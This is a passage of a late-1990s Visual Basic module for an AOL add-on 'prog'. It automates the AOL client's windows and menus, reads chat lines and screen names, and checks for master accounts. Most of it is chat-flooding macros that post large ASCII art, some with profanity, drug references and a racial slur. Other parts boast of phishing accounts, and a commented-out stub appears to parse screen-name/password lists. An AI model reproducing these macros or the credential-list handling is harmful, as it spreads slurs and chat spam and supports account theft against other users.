  lngprnticon% = FindWindowEx(lngprntwindow%, 0&, "_AOL_Icon", vbNullString)
  Loop Until lngprntwindow% <> 0& And lngprnticon% <> 0&
  TimeOut (0.5)
  Do
  Call PostMessage(lngprnticon%, WM_LBUTTONDOWN, 0&, 0&)
  Call PostMessage(lngprnticon%, WM_LBUTTONUP, 0&, 0&)
  TimeOut (0.5)
 DoEvents
 lngmodal% = FindWindow("_AOL_Modal", vbNullString)
 lngmodalstatic% = FindWindowEx(lngmodal%, 0&, "_AOL_Static", vbNullString)
 okwin% = FindWindow("#32770", "America Online")
 e2 = FindChildByClass(okwin%, "Static")
 e2 = GetWindow(e2, GW_HWNDNEXT)
 okwinmsgmsg$ = gettext(e2)
 Clipboard.SetText okwinmsgmsg$
 If okwinmsgmsg$ = "You have more than 5 screen names. Please use AOL 5.0 or later to access this feature." Then waitforOK: GoTo yea
 
 Loop Until lngmodal% <> 0 And lngmodalstatic% <> 0& And gettext(lngmodalstatic%) <> ""
 If RePlacestRing(RePlacestRing(gettext(lngmodalstatic%), Chr$(10&), ""), Chr$(13&), "") = "Set Parental Controls" Then
yea:
izMaZter = True
Else
izMaZter = False
End If
 TimeOut (0.3)
 Call SendMessageLong(lngmodal%, WM_CLOSE, 0&, 0&): DoEvents
 Call SendMessageLong(lngprntwindow%, WM_CLOSE, 0&, 0&): DoEvents

End Function

Function AOL25_Buzt(timez As Label, sec As Label, lst As ListBox, TMRsec As Timer, staRt As Control, sterp As Control, kw As TextBox)
'Do
'DoEvents:
'If AOL25_FindroOm = 1 Then GoTo nex
'Call AOL25_keyword(kw + lst)
'TimeOut (0.25)
'If AOL25_FindroOm = 1 Then GoTo nex
'Call AOL25_ClickNO(timez,)
'If AOL25_FindroOm = 1 Then GoTo nex
'TimeOut (0.25)
'daRoom$ = LCase(RemoveSpace(Combo1 + " - " + List1))
'findRo$ = LCase(RemoveSpace(AOL25_GetCurrentRoOmName))
'If AOL25_FindroOm = 1 Then GoTo nex
'Loop Until findRo$ = daRoom$''
'nex:
'staRt.Enabled = True
'sterp.Enabled = False
'TMRsec.Enabled = False
'TimeOut (0.1)
' Sendchat_AOL25 ("(¯`v^÷•Diz Dick BuzTa Sucked in2: " + List1 + " •×")
' Sendchat_AOL25 ("(_,v^÷•In [" + timez.caption + "] Lick'z [" + sec.caption + "] Secondz [AOL25]•×")
'lst.Enabled = True
'TimeOut (0.3)
'timez.caption = "1"
'sec.caption = "1"
'TimeOut (0.1)
End Function

Sub Macro_9mm()
sendchat ".       ________________________|"
TimeOut (0.5)
sendchat ".     -|_////_(____)______________|0|"
TimeOut (0.5)
sendchat ".        )  @   ___9mm__________\_/"
TimeOut (0.5)
sendchat ".       /-------/(  ||   //"
TimeOut (0.5)
sendchat ".      /  xxx /___//     {S 9mm}"
TimeOut (0.5)
sendchat ".     / xxxxx //"
TimeOut (0.5)
sendchat ".   / xxxxx //"
TimeOut (0.5)
sendchat ".  |______//"
TimeOut (2)

End Sub

Sub Macro_Alien()
sendchat ".  .     .  :     .    .. :.  .___---------------___."
TimeOut (0.5)
sendchat "       .  .   .    .  :.:. _ '.^ .^ ^.           '.. :'-_. ."
TimeOut (0.5)
sendchat ".    .  :       .  .  .:../:                       . .^  :.:\."
TimeOut (0.5)
sendchat ".        .   . :: +. :.:/: .   .    .                  . . .:\"
TimeOut (0.5)
sendchat ". .  :    .     . _ :::/:                        .    ^ .  . .:\"
TimeOut (0.5)
sendchat "  .. . .   . - : :.:./.                        .               .:\"
TimeOut (0.5)
sendchat "  .      .     . :..|:                                 .  .  ^. .:|"
TimeOut (0.5)
sendchat "    .       . : : ..||        .                              . . !:|"
TimeOut (0.5)
sendchat "  .     . . . ::. ::\(                                        . :)/"
TimeOut (0.5)
sendchat " .   .     : . : .:.|. ######                  .#######::|"
TimeOut (0.5)
sendchat "  :.. .  :-  : .:  ::|.#######              ..########:|"
TimeOut (0.5)
sendchat " .  .  .  ..  .  .. :\ ########             :######## :/"
TimeOut (0.5)
sendchat "  .        .+ :: : -.:\ ########         . ########.:/"
TimeOut (0.5)
sendchat "    .  .+   . . . . :.:\. #######         #######..:/"
TimeOut (0.5)
sendchat "      :: . . . . ::.:..:.\                       .     .   ..:/"
TimeOut (0.5)
sendchat "   .   .   .  .. :  -::::.\.               | |          . .:/"
TimeOut (0.5)
sendchat "      .  :  .  .  .-:.':.::.\                         ..:/"
TimeOut (0.5)
sendchat " .      -.   . . . .: .:::.:.\.                      .:/"
TimeOut (0.5)
sendchat ".   .   .  :      : ....::_:..:\       ___.      :/"
TimeOut (0.5)
sendchat "   .   .  .   .:. .. .  .: :.:. :\                 :/"
TimeOut (0.5)
sendchat "     +   .   .   : . ::. :.:. .:.|\           .:/|"
TimeOut (0.5)
sendchat "     .         +   .  .  ...:: ..|  --.         :|"
TimeOut (0.5)
sendchat ".      . . .   .  .  . ... :..:..    '(  ..)"
TimeOut (0.5)
sendchat " .   .       .      :  .   .: ::/  .           .::\"
TimeOut (0.5)
sendchat " ...†HÊ¥ ® W@†©HiNG...                ReGuLaTa 2"
TimeOut (2)

End Sub

Sub Macro_Barney()
sendchat ".                           ____"
TimeOut (0.5)
sendchat ".                       ,/¯,,    ,¯\,"
TimeOut (0.5)
sendchat ".          _        ,-'    @   @ '\,"
TimeOut (0.5)
sendchat ".         {  ¯'\   (  -~,          -,-  )    „„„"
TimeOut (0.5)
sendchat ".          '~,   ',  \    \ '       '|   /   /   ')      Barney !"
TimeOut (0.5)
sendchat ".             \    '~-\    \¯¯¯¯/  ,-',-'   ,~'"
TimeOut (0.5)
sendchat ".              \        ',~,,¯¯¯,,~'     ,-'"
TimeOut (0.5)
sendchat ".                \     /     ¯¯¯  \    ,-'"
TimeOut (0.5)
sendchat ".                 |    |¤     ¤|    |"
TimeOut (0.5)

End Sub

Sub Macro_DJ()
MAXIMIZE_CHAT
sendchat ".                                     ______"
TimeOut (0.5)
sendchat ".                               .·´.¯¯¯¯\:::::\"
TimeOut (0.5)
sendchat ".                             / /__\       \:::::\"
TimeOut (0.5)
sendchat ".                            |_|___)____|:::::|_____"
TimeOut (0.5)
sendchat ".                      .·´ )(¯\'   .·´  _    `|¯|´¯¯¯¯¯¯"
TimeOut (0.5)
sendchat ".                     / ·´ ) (\_((_.·Ó  ) .-|_|- ."
TimeOut (0.5)
sendchat ".                    (   \(:(¯¯`          (:sony:)"
TimeOut (0.5)
sendchat ".                     \    `|  __.·´¯¯)   ` -(('- ´¯¯¯¯`·."
TimeOut (0.5)
sendchat ".                       \__`·.   ¯¯¯ . ´     ))             \"
TimeOut (0.5)
sendchat ".                       /¯¯¯¯)¯¯¯         (( (_/           \"
TimeOut (0.5)
sendchat ".                  .·´          \|             _)) /             |"
TimeOut (0.5)
sendchat ".              .·´              /       (¯¯(     `·.–.––.     \"
TimeOut (0.5)
sendchat ".            (                /     _.·´|    |    |/   /    )\¯¯\ `·."
TimeOut (0.5)
sendchat ".         ____\\ ____ /. · ´(___/   /    / \__\__ / )       \_"
TimeOut (0.5)
sendchat ".                  \\    ·´:::::::::.·´ .·´  .·´:::`: .¯¯¯¯         /"
TimeOut (0.5)
sendchat ".                  |\¯ \:::::::: (  ¨ ¨o¨ ¨  ):::::::: `.____. · ´"
TimeOut (0.5)
sendchat ".                   \'\_°\:::::::::`  ·  ·  ´:::::::::::::'    ooo"
TimeOut (0.5)
sendchat ".                     '¯v.::::::::::::::::::::::::::::::.´      ooo"
TimeOut (0.5)
sendchat ".                        ` ::::::::::::::::::::::::::: ´ "
TimeOut (0.5)
sendchat ".                             `   ·   ·   ·   ·   ´"
TimeOut (0.5)

End Sub


Sub Macro_Dragon()
sendchat ".              ////-==\\                                `//~\\   ~\"
TimeOut (0.5)
sendchat ".         _///_ -==|  \\                               | |  \\_~`~\"
TimeOut (0.5)
sendchat ".          //~~~ ,-/-==\\                             | |   `\ ~~~\"
TimeOut (0.5)
sendchat ".       /_-~       /'    |  \\                           / /~~  \    /' \\"
TimeOut (0.5)
sendchat ".     /  .'        /       |   \\                        /' /      /  \/'     \\"
TimeOut (0.5)
sendchat ".   /  ____  /         |    \`\.__/-~~ ~ \ _ _/'  /  ~/-~- \   ~  \\"
TimeOut (0.5)
sendchat ".  /-'~    ~~~~~---__  |  ~-/~         ( )      /'   /_--~`/ \    /' \\"
TimeOut (0.5)
sendchat ".                      '~~--_/ ~~  _-~/-  / \      '-~ \ /          \  V"
TimeOut (0.5)
sendchat ".                     {\__--_/}    / \\_>- )<__\        \            V"
TimeOut (0.5)
sendchat ".                     /'   (_/  _-~    | |__>--<__|       |"
TimeOut (0.5)
sendchat ".                    |0  0 _/) )-~     | |__>--<__|       |"
TimeOut (0.5)
sendchat ".                   / /~ ,_/           / /__>---<__/      |"
TimeOut (0.5)
sendchat ".                  o o _//           /-~_>---<__-~      /   {S dragon}"
TimeOut (0.5)
sendchat ".                   (^(~             /~_>---<__-      _-~"
TimeOut (0.5)
sendchat ".                  ,/|               /__>--<__/     _-~   - ReGuLaTa 2"
TimeOut (0.5)
sendchat ".               ,//('(               |__>--<__|     /                .----_"
TimeOut (0.5)
sendchat ".              ( §'))               |__>--<__|    |               /' ---_~\"
TimeOut (0.5)
sendchat ".           `-)) )) (                |__>--<__|    |              /'  /    \`\\"
TimeOut (0.5)
sendchat ".         ,/,'//( (                    \__>--<__\    \           /' //       \||"
TimeOut (0.5)
sendchat ".       ,( ( ((, ))                     ~-__>--<_~-_  ~--____---~' _/'/"
TimeOut (0.5)
sendchat ".     `~/  )` ,/|                          ~-_~>--<_/-__       __-~ _//"
TimeOut (0.5)
sendchat ".  _-~//( )/ )) `                            ~~-'_/_/ /~~~~~~~_--~"
TimeOut (0.5)
sendchat ".    ;'( ')/ ,)(                                         ~~~~~~~~~~"
TimeOut (0.5)
End Sub

Sub Macro_ElmozFukedUp()
sendchat ".                    __   __"
TimeOut (0.5)
sendchat ".                  .'    '. '   `."
TimeOut (0.5)
sendchat ".              _.-|  <Font Color=#ff3300>o<Font Color=#gggggg>  | <Font Color=#ff3300>o<Font Color=#gggggg>  |-._"
TimeOut (0.5)
sendchat ".            .~   `.__.'.__.'^  ~."
TimeOut (0.5)
sendchat ".          .~     ^  /    \  ^      ~."
TimeOut (0.5)
sendchat ".          \-._^   ^|      |   ^_. -/            )"
TimeOut (0.5)
sendchat ".          `\  `-._  \___/ ^_.-'  /'              ( ) )"
TimeOut (0.5)
sendchat ".            `\_   `--...--'        /'            ) ( ( (    "
TimeOut (0.5)
sendchat ".               `-.._______..-'     /\  /\           )"
TimeOut (0.5)
sendchat ".                  __/   \__         | |/ /<Font Color=#996600> _____<Font Color=#ff3300>''"
TimeOut (0.5)
sendchat ".                .'^    ^      `.      .'    <Font Color=#996600>(_____\\<Font Color=#ff3300>#="
TimeOut (0.5)
sendchat ".              .'    ^     ^    `.__.'^ .\ \ )"
TimeOut (0.5)
sendchat ".             .' ^ .    ^   .    ^  .'  \/"
TimeOut (0.5)
sendchat ".            /    /        ^ \'.__.' <B>Hey Boys and Girls,"
TimeOut (0.5)
sendchat ".           |  ^ /|   ^      |        <B> (/\)eed iz good!"
TimeOut (0.5)
sendchat ".            \   \|^      ^  |"
TimeOut (0.5)
sendchat ".             `\^ |        ^ |"
TimeOut (0.5)
sendchat ".               `~|    ^    |     {S ElmozFuckedUp}"
TimeOut (0.5)
sendchat ".                 |  ^     ^ |"
TimeOut (0.5)
sendchat ".                 \^         /"
TimeOut (0.5)
sendchat ".                  `.    ^ .'"
TimeOut (0.5)
sendchat ".                   : ^  ;"
TimeOut (0.5)
sendchat ".       -~~~~~~   |  ^ ~~~~~~-."
TimeOut (0.5)
sendchat ".   /   ^     ^ |    ^        \ ^    ^     \"
TimeOut (0.5)
sendchat ".   \^     ^   / \  ^     ^    / ^      ^  /"
TimeOut (0.5)
sendchat ".    `~~~~~~~~'   `~~~~~~~~~'<B>Ou(/\)oP (\/)acroZ"
TimeOut (0.5)
End Sub


Sub Macro_FuckDMX()
sendchat "|\¯¯¯|\__/|||¯¯¯|_|¯¯'|  /¯¯¯/\__)°|¯¯¯|/¯¯/_'"
TimeOut (0.4)
sendchat " \|__'(¯|_|/ |\______/| |\     \/¯¯¯)|___|\___\'"
TimeOut (0.4)
sendchat "  |__ |¯      \|_____|/_ \|¯¯¯¯¯¯| |___|\|___|"
TimeOut (0.4)
sendchat "                                ¯¯¯¯¯¯ '            '"
TimeOut (0.4)
sendchat "        |\¯¯¯|\¯¯\    /¯¯\/¯ \   |\¯¯\/'¯¯/|"
TimeOut (0.4)
sendchat "        \/___|/__/| /__ (\/)__\°\/__/\__\/"
TimeOut (0.4)
sendchat "         |___ |__'|/||___ |v|___|'|__'|/\|__|'"
TimeOut (0.4)

End Sub

Sub Macro_GoinPhishin()
sendchat ".  __|_%__|__               // \Going Phishin!"
TimeOut (0.5)
sendchat ".      |  (oo)                  //    \ <>< ><>"
TimeOut (0.5)
sendchat ".      | |   O \               //       \Here Accountz !"
TimeOut (0.5)
sendchat ".   _ | \__o_/             //          \"
TimeOut (0.5)
sendchat ".  /\ \‡‡\_/‡\ \\         //             \ "
TimeOut (0.5)
sendchat ". |‡|| |‡‡‡‡‡| |‡\__ o//                \"
TimeOut (0.5)
sendchat ". |‡||  --   ---  |‡‡‡‡|//8                 \"
TimeOut (0.5)
sendchat ". \‡‡‡‡_)___|      //                      \"
TimeOut (0.5)
sendchat ".    | /         \ |    //                         \"
TimeOut (0.5)
sendchat ".    |       |     |                                 \"
TimeOut (0.5)
sendchat ".    |____|___|                                  \"
TimeOut (0.5)
sendchat ".     |__|_ |__|_                                   \"
TimeOut (0.5)
sendchat ". __|____\|___\______~^~^~^~^~^~^~^~^~^~^~^~^~^~^"
TimeOut (0.5)
sendchat ". |                              |   ><> ~^><}}}}}>~^~"
TimeOut (0.5)
sendchat ". |                              |~^~^ HELP Uz! ~^~^~"
TimeOut (0.5)
sendchat ". |_________________|<><   <)))))><         ~^~^~^~^~~^"
TimeOut (0.5)
sendchat ".  ><))))>          ><>   <O>< "
TimeOut (0.5)
sendchat ".><.i> <M>< <>< <G>< ,><>                           <D><"
TimeOut (0.5)
TimeOut (0.5)
End Sub


Sub Macro_GottaShit()
sendchat ":            (  }"
TimeOut (0.5)
sendchat ":  ===    /\\"
TimeOut (0.5)
sendchat ":  |    |º  /  /\\„„  BRB"
TimeOut (0.5)
sendchat ":  |__|   L_==n"
TimeOut (0.5)
sendchat ":     L|¯¯¯¯)  ||"
TimeOut (0.5)
sendchat ":       )¯¯(      |"
TimeOut (0.5)
sendchat ":  ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯{S GottaShit}"
TimeOut (1)

End Sub

Sub Macro_Guide()
sendchat ".                               ____________________"
TimeOut (0.5)
sendchat ".                              /  Dah, ummmm hmmm  \"
TimeOut (0.5)
sendchat ".                 .-'`\/`'-.   |      Did someone call      |"
TimeOut (0.5)
sendchat ".                / ~   ~ \  \___   a Guide????         /"
TimeOut (0.5)
sendchat ".             .-`  /\   /\  `-.      \/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯"
TimeOut (0.5)
sendchat ".             :  (o ) ( o)   :     º      {S FuckaGuide}"
TimeOut (0.5)
sendchat ".             |     (¯¯)     |   º"
TimeOut (0.5)
sendchat ".              `-.   `¯    .-` º"
TimeOut (0.5)
sendchat ".                (  (¯¯)  ) º                 ®OuWoP®"
TimeOut (0.5)
sendchat ".                 `-.¯U.-`                    ™1999™"
TimeOut (0.5)
End Sub

Sub Macro_HandzUP()
sendchat "."
TimeOut (0.5)
sendchat ".               *   *                                     *  *"
TimeOut (0.5)
sendchat ".            *  /¯/¯/ *                               * \¯\¯\  *"
TimeOut (0.5)
sendchat ".         *   /     /    *                            *    \     \*"
TimeOut (0.5)
sendchat ".        *  /   __¯/  *                               * \¯__  \*"
TimeOut (0.5)
sendchat ".          *\    \  *                                      * /    /*"
TimeOut (0.5)
sendchat ".             \*   \)\                                   /(/   */"
TimeOut (0.5)
sendchat ".             //\ /    \            ___              /    \ /\\"
TimeOut (0.5)
sendchat ".           //::/        \      *   *   *   *       /        \::\\"
TimeOut (0.5)
sendchat ".          ||:::|           \ *        ^        *  /          '|:::||"
TimeOut (0.5)
sendchat ".          ||:::|              )* (        ) ))*(             ''|:::||"
TimeOut (0.5)
sendchat ".          ||:::|                ) )Õ  Õ((                  '|:::||"
TimeOut (0.5)
sendchat ".          ||:::|              (  (    _\    ))               ''|:::||"
TimeOut (0.5)
sendchat ".           \\::\               ) (    ^    ))               /::://"
TimeOut (0.5)
sendchat ".             \Y/______ (     (     ( (    ______ \Y/"
TimeOut (0.5)
sendchat ".               v            /  \     )    )  ) \    ¸  *¤  v ¸"
TimeOut (0.5)
sendchat ".         ¸ *  *  * ¸      /      )  (   ( /     \¸*            *¸"
TimeOut (0.5)
sendchat ".   ¸ '     ¤      ''¸  /        \    )  )        \  ¤       ¸¤ ¸¸"
TimeOut (0.5)
sendchat ".              ¸ ¤¸ ¸  /            \( (            \    ¸ *  ¤* ¸"
TimeOut (0.5)
sendchat ".          ¸ *       * ¸  ¸  ¸  ¸    Y    ¸  ¸  ¸  ¸\*   ¤¤   *¸"
TimeOut (0.5)
sendchat ".              ¤      ¸ *   ¤     * ¸  ¸ *  ¤          * ¸"
TimeOut (0.5)
sendchat ".                                ¤  ¸ *               ¤      *¸"
TimeOut (0.5)
sendchat ".<B> All Ma Real Live Niggaz Throw Ya Handz Up!"
TimeOut (2)
End Sub


Sub Macro_iMfuckedUP()
'ƒ  £ É Ë
smoke = "<font face=arial>'"
smoke2 = "<font face=arial>,"
blunt = "<font face=arial>=='     Im Fucked Up !"
 g = "<font face=symbol>£"
 f = "<font face=wingdings><Font Color=#ff3300>ƒ"
    h = "<font face=symbol>É"
    i = "<font face=symbol>Ë"
    TimeOut (0.5)
sendchat g + g + g + g + g + "  " + smoke2 + smoke + smoke2 + smoke
TimeOut (0.5)
sendchat " " + f + f + "     "
TimeOut (0.5)
sendchat "   " + h + "     " + smoke2 + smoke + smoke2
TimeOut (0.5)
sendchat "  " + i + blunt + smoke
TimeOut (0.5)
End Sub

Sub Macro_SkullFIRE()
sendchat ".                             ___________      )    ^        |\"
TimeOut (0.6)
sendchat ".                           /:::::::::::::::::::::\    (       /|        /;/"
TimeOut (0.6)
sendchat ".    (         /|          /;:::::::::::::::::::::::\     )    \;\       \;;\"
TimeOut (0.6)
sendchat ".    ))       \;\        /:::::::::::::::::::::::::::\       /;;;/     /;;;;;/"
TimeOut (0.6)
sendchat ".   ( (       /;;/     /:::::::::::::::::::::::::::::::\    \;;;;;\    \;;;;;\"
TimeOut (0.6)
sendchat ".   ) )      \;;;;\  /::::::::: _,.- ---- -.,_:::::::::\  /;;;;;;;/  /;;;;;;/"
TimeOut (0.6)
sendchat ".           /;;;;;;//:::::::,-~                   ~-.::: \;;YOUR;;;;/"
TimeOut (0.6)
sendchat ".       ^  /;;;; \/::::: ,^___                 ___^.:: \;;NEXT;;/"
TimeOut (0.6)
sendchat ".       /|  \; ;; |:: /~'    ~'           '~      '~\:::\/;;;;;;;;/"
TimeOut (0.6)
sendchat ".       \;\   \ ;;|:: Y    ,---. _      I      _ .---. Y:::\;;;;/"
TimeOut (0.6)
sendchat ".       /;;/    \ |: | Y         ~ .  |  ,-~          Y |:::|;/"
TimeOut (0.6)
sendchat ".       ;;;;     /:: | |     (-)     }:{        (-)      |  |:::|   ^      )"
TimeOut (0.6)
sendchat ".              /::::: |             / | \                !  |::::\        (("
TimeOut (0.6)
sendchat ".            /::.-~/   (__,.---'    .^.  '---.,__)  \ ~-.  ,:\     ) )"
TimeOut (0.6)
sendchat ".            |:(                  /  /  |  \  \                     ):\ ( ("
TimeOut (0.6)
sendchat ".      (     |:: \.____,      ~   \/ ' \/ ~         .____,/:::/"
TimeOut (0.6)
sendchat ".      ))     \::::::::: |  |T  ~\    !     !    /~    T| |::::::/ ^"
TimeOut (0.6)
sendchat ".  ^  ( (  ^   \:::::: |  |1       _ _ _ _ _       !| |::::://|    (    ^"
TimeOut (0.6)
sendchat ".  /|       /|    \::: |  1  \/V V V V V V \/ j  |::::/  \;;\   ))  |\"
TimeOut (0.6)
sendchat ".  \;\     \;\     |:::1  \   \  |_|_|_|_|_|  /   /   !:::|  /;;;;;/( ( /;/"
TimeOut (0.6)
sendchat ". /;;;/   /;;;;/    \::: \   \ [T T T T T T T /  ./:::/ /;;;;;/    \;;;\"
TimeOut (0.6)
sendchat ".\;;;;;\/;;;;;;;/     \::: \.._ _ _ _ _ _ _ _../:::/  \;;;;;;;\   /;;;;;/"
TimeOut (0.6)
sendchat "./;;;;;;\;;;;;;;;\     |::::::::::::::|:::::::::::::::::/   /;;;;;;;;/  \;;;;;;;\"
TimeOut (0.6)
sendchat ".;;;;;;;/;;;;;;;;;;    |:::: :::::::::|:ReGuLaTa 2:::::|  ;;;;;;;;;;;;;  ;;;;;;;;;"
TimeOut (0.6)
End Sub


Sub Macro_SparkWEED()
sendchat ".    ___       <Font Color=#ff3300><B>A"
TimeOut (0.5)
sendchat ".    |    |     <Font Color=#ff3300><B>{ * }"
TimeOut (0.5)
sendchat ".    |    |   __<Font Color=#ff3300><B>V<Font Color=#gggggg>__"
TimeOut (0.5)
sendchat ".    |__|o_|%%%|0_"
TimeOut (0.5)
sendchat ".         |             |"
TimeOut (0.5)
sendchat ".         | .     .     | <b><i>Spark Da Weed!"
TimeOut (0.5)
sendchat ".         |_______ |"
TimeOut (0.5)

End Sub


Public Function izRoomPrivate() As Boolean
    Dim AolImage As Long
    AolImage& = FindWindowEx(FindRoom&, 0&, "_AOL_Image", vbNullString)
    If IsWindowVisible(AolImage&) = False Then
        izRoomPrivate = True
       ElseIf IsWindowVisible(AolImage&) = True Then
        izRoomPrivate = False
    End If
End Function

Public Sub runaolmenubystring(strmenutext As String)
    Dim lngaol As Long, lngmmenu As Long, lngmmcount As Long
    Dim lngindex As Long, lngsubmenu As Long, lngsmcount As Long
    Dim lngindex2 As Long, lngsmid As Long, strstring As String
    Let lngaol& = FindWindow("aol frame25", vbNullString)
    Let lngmmenu& = GetMenu(lngaol&)
    Let lngmmcount& = GetMenuItemCount(lngmmenu&)
    For lngindex& = 0& To lngmmcount& - 1&
        Let lngsubmenu& = GetSubMenu(lngmmenu&, lngindex&)
        Let lngsmcount& = GetMenuItemCount(lngsubmenu&)
        For lngindex2& = 0& To lngsmcount& - 1&
            Let lngsmid& = GetMenuItemID(lngsubmenu&, lngindex2&)
            Let strstring$ = String$(100, " ")
            Call GetMenuString(lngsubmenu&, lngsmid&, strstring$, 100&, 1&)
            If InStr(LCase$(strstring$), LCase$(strmenutext$)) Then
                Call SendMessageLong(lngaol&, WM_COMMAND, lngsmid&, 0&)
                Exit Sub
            End If
        Next lngindex2&
    Next lngindex&
End Sub


Sub TAG_CheckOK()
'ouwop
okwin% = FindWindow("#32770", "America Online")
e2 = FindChildByClass(okwin%, "Static")
e2 = GetWindow(e2, GW_HWNDNEXT)
okie$ = gettext(e2)
If okie$ = "Profiles cannot be updated right now." Then
waitforOK
MsgBox "Sorry, you may have some Invalid Characterz in the profile, AOL dont Allow some ascii", vbCritical, "Error >;["
Else
waitforOK
MsgBox "Tagged Profile Succesfully!", 64, "DONE"
End If
End Sub

Function Tag_KillReminder()
'ouwop
aomodal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(aomodal%, "_AOL_Icon")
aostat% = FindChildByClass(aomodal%, "_AOL_Static")
ster$ = gettext(aostat%)
If ster$ = "Remember: Your AOL Member Profile is available to the entire AOL community." Then
Tag_KillReminder = 1
Call AOL4_KillWin(aomodal%)
Else
Tag_KillReminder = 0
End If
End Function

Public Function sendchatspiral(strstring As String)
    Dim lngindex As Long, lnglen As Long
    lnglen& = Len(strstring$)
    Do: DoEvents
        lngindex& = lngindex& + 1&
     Call sendchat(Left$(strstring$, lngindex&))
    TimeOut (0.5)
    Loop Until lngindex& = lnglen&

End Function

Public Sub runaolmenu(lngmenunumber As Long, lngsubmenunumber As Long)
    Dim lngaol As Long, lngmenu As Long, lngsubmenu As Long, lngid As Long
    Let lngaol& = FindWindow("AOL Frame25", vbNullString)
    Let lngmenu& = GetMenu(lngaol&)
    Let lngsubmenu& = GetSubMenu(lngmenu&, lngmenunumber&)
    Let lngid& = GetMenuItemID(lngsubmenu&, lngsubmenunumber&)
    Call SendMessageLong(lngaol&, WM_COMMAND, ByVal lngid&, 0&)
End Sub

Sub AOL25_IMsoff()
Call AOL25_sendim("$IM_OFF", "mazta progg")
End Sub
Sub AOL25_IMsoN()
Call AOL25_sendim("$IM_ON", "mazta progg")
End Sub

Function AOL25_LastChatLine()
'This will get the last line in the chat
'room
getpar = AOL25_FindroOm()
child = FindChildByClass(getpar, "_AOL_View")
gettrim = SendMessageByNum(child, 14, 0&, 0&)
trimspace$ = Space$(gettrim)
getString = SendMessageByString(child, 13, gettrim + 1, trimspace$)
theview$ = trimspace$
For FindChar = 1 To Len(theview$)
thechar$ = Mid(theview$, FindChar, 1)
thechars$ = thechars$ & thechar$
If thechar$ = Chr(13) Then
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If
Next FindChar
lastlen = Val(FindChar) - Len(thechars$)
If thechars$ = "" Then GoTo bad
lastline = Mid(theview$, lastlen + 1, Len(thechars$) - 1)
If lastline <> "" Then
AOL25_LastChatLine = lastline
Else
bad:
AOL25_LastChatLine = " "
End If
End Function



Function AOL25_FindSignOnScreeN()
'If FindAwin2("Goodbye from America Online!") = 0 Then Exit Function
'If FindAwin2("Welcome") = 0 Then Exit Function
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim SignOnCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    SignOnCaption$ = getcaption(AOLChild&)
    If SignOnCaption$ = "Welcome" Or SignOnCaption$ = "Goodbye from America Online!" Then
        AOL25_FindSignOnScreeN = AOLChild&
        Exit Function
       Else
        Do
            AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
            If SignOnCaption$ = "Sign On" Or SignOnCaption$ = "Goodbye from America Online!" Then
                AOL25_FindSignOnScreeN = AOLChild&
                Exit Function
            End If
        Loop Until AOLChild& = 0&
    End If
    AOL25_FindSignOnScreeN = AOLChild&
End Function
Function AOLUK_FindSignOnScreeN()
'ouwop
    Dim AolFrame As Long, AolMdi As Long, AOLChild As Long
    Dim SignOnCaption As String
    AolFrame& = FindWindow("AOL Frame25", vbNullString)
    AolMdi& = FindWindowEx(AolFrame&, 0&, "MDIClient", vbNullString)
    AOLChild& = FindWindowEx(AolMdi&, 0&, "AOL Child", vbNullString)
    SignOnCaption$ = getcaption(AOLChild&)
    If SignOnCaption$ = "Sign On to AOL" Or SignOnCaption$ = "Goodbye from AOL!" Then
        AOLUK_FindSignOnScreeN = AOLChild&
        Exit Function
       Else
        Do
            AOLChild& = FindWindowEx(AolMdi&, AOLChild&, "AOL Child", vbNullString)
            If SignOnCaption$ = "Sign On to AOL" Or SignOnCaption$ = "Goodbye from AOL!" Then
                AOLUK_FindSignOnScreeN = AOLChild&
                Exit Function
            End If
        Loop Until AOLChild& = 0&
    End If
    AOLUK_FindSignOnScreeN = AOLChild&
End Function

Sub AOL25_GuesTtoGuesT()
    ComboBox& = FindWindowEx(AOL25_FindSignOnScreeN, 0&, "_AOL_Combobox", vbNullString)
    Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
    Call PostMessage(ComboBox&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ComboBox&, WM_LBUTTONUP, 0&, 0&)
    TimeOut (0.001)
    Call SendMessageLong(ComboBox&, CB_SETCURSEL, ComboCount(ComboBox&) - 2, 0&)
End Sub

Function AOL25_LastLine()
chatTrim$ = Left$(AOL25_LastChatLine, 11)
For z = 1 To 11
If Mid$(chatTrim$, z, 1) = ":" Then sn$ = Left$(chatTrim$, z - 1)
Next z
Text = AOL25_LastChatLine
ChatTrimNum = Len(sn$)
chatTrim$ = Mid$(AOL25_LastChatLine, ChatTrimNum + 1, Len(Text)) ' - Len(sn$))
pw$ = chatTrim$
pw$ = RePlacestRing(pw$, ":", "")
pw$ = RePlacestRing(pw$, Chr(9), "")
AOL25_LastLine = pw$
End Function

Function AOL25_SNfromlastChatLine()
chatTrim$ = Left$(AOL25_LastChatLine, 17)
For z = 1 To 17
If Mid$(chatTrim$, z, 1) = ":" Then sn$ = Left$(chatTrim$, z - 1)
Next z
AOL25_SNfromlastChatLine = sn$
End Function



Sub Phish_SNPW_LIzT()
'chattrim$ = Left$(List1, 11)
'For z = 1 To 11
'If Mid$(chattrim$, z, 1) = "-" Then sn$ = Left$(chattrim$, z - 1)
'Next z
'text = List1
'ChatTrimNum = Len(sn$)
''chattrim$ = Mid$(text, ChatTrimNum + 1, Len(text) - Len(sn$))
'chattrim$ = Mid$(text, ChatTrimNum + 1, Len(text)) ' - Len(sn$))
'PW$ = chattrim$
'PW$ = ReplaceString(PW$, "-", "")
End Sub




Public Function ReplaceCharacters(MainString As String, ToLookFor As String, ToReplaceWith As String) As String
    Dim NewMain As String, Instance As Long
    NewMain$ = MainString$
    Do While InStr(1, NewMain$, ToLookFor$)
       DoEvents
       Instance& = InStr(1, NewMain$, ToLookFor$)
       NewMain$ = Left(NewMain$, (Instance& - 1)) & ToReplaceWith$ & Right(NewMain$, Len(NewMain$) - (Instance& + Len(ToLookFor$) - 1))
    Loop
